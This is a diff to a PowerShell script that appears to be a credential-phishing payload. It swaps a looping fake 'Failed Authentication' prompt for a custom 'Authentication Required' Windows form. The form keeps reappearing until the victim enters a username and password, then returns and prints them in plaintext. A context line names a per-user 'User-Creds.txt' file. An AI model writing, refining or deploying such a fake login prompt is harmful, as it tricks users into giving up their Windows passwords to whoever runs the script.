@@ -43,44 +43,75 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
+Add-Type -AssemblyName System.Windows.Forms
+
 function Get-Creds {
     while ($true) {
-        # Display the credential prompt
-        $cred = $host.ui.promptforcredential(
-            'Failed Authentication',
-            '',
-            [Environment]::UserDomainName + '\' + [Environment]::UserName,
-            [Environment]::UserDomainName
-        )
+        # Create the form and the controls for username and password input
+        $form = New-Object Windows.Forms.Form
+        $form.Text = "Authentication Required"
+        $form.Width = 300
+        $form.Height = 200
+        $form.StartPosition = 'CenterScreen'
 
-        # Check if the user canceled the prompt (returns null when canceled)
-        if ($cred -eq $null) {
-            Add-Type -AssemblyName PresentationCore,PresentationFramework
-            $msgBody = "No credentials were provided. Please try again."
-            $msgTitle = "Error"
-            $msgButton = 'Ok'
-            $msgImage = 'Stop'
-            [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
-            continue
-        }
+        $labelUser = New-Object Windows.Forms.Label
+        $labelUser.Text = "Username:"
+        $labelUser.Location = New-Object System.Drawing.Point(10, 20)
+        $form.Controls.Add($labelUser)
 
-        # Get the password from the credential object
-        $password = $cred.GetNetworkCredential().Password
+        $textUser = New-Object Windows.Forms.TextBox
+        $textUser.Location = New-Object System.Drawing.Point(80, 20)
+        $form.Controls.Add($textUser)
 
-        # If the password is empty, show the error message
-        if ([string]::IsNullOrWhiteSpace($password)) {
-            Add-Type -AssemblyName PresentationCore,PresentationFramework
-            $msgBody = "Credentials cannot be empty! Please enter a valid password."
+        $labelPass = New-Object Windows.Forms.Label
+        $labelPass.Text = "Password:"
+        $labelPass.Location = New-Object System.Drawing.Point(10, 60)
+        $form.Controls.Add($labelPass)
+
+        $textPass = New-Object Windows.Forms.TextBox
+        $textPass.Location = New-Object System.Drawing.Point(80, 60)
+        $textPass.UseSystemPasswordChar = $true
+        $form.Controls.Add($textPass)
+
+        $btnSubmit = New-Object Windows.Forms.Button
+        $btnSubmit.Text = "Submit"
+        $btnSubmit.Location = New-Object System.Drawing.Point(80, 100)
+        $form.Controls.Add($btnSubmit)
+
+        # When the Submit button is clicked, return the values
+        $btnSubmit.Add_Click({
+            $form.Close()
+        })
+
+        # Show the form
+        $form.ShowDialog()
+
+        # Get the username and password from the form
+        $userName = $textUser.Text
+        $password = $textPass.Text
+
+        # Check if the user entered both fields
+        if ([string]::IsNullOrWhiteSpace($userName) -or [string]::IsNullOrWhiteSpace($password)) {
+            $msgBody = "You must enter both a username and password."
             $msgTitle = "Error"
             $msgButton = 'Ok'
             $msgImage = 'Stop'
             [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
         } else {
-            return $cred.GetNetworkCredential() # Return the valid credentials
+            # Return the credentials as an object
+            $cred = New-Object -TypeName PSCustomObject -Property @{
+                UserName = $userName
+                Password = $password
+            }
+            return $cred
         }
     }
 }
 
+# Example of using the function
+$creds = Get-Creds
+Write-Host "Username: $($creds.UserName)"
+Write-Host "Password: $($creds.Password)"
 
 
 
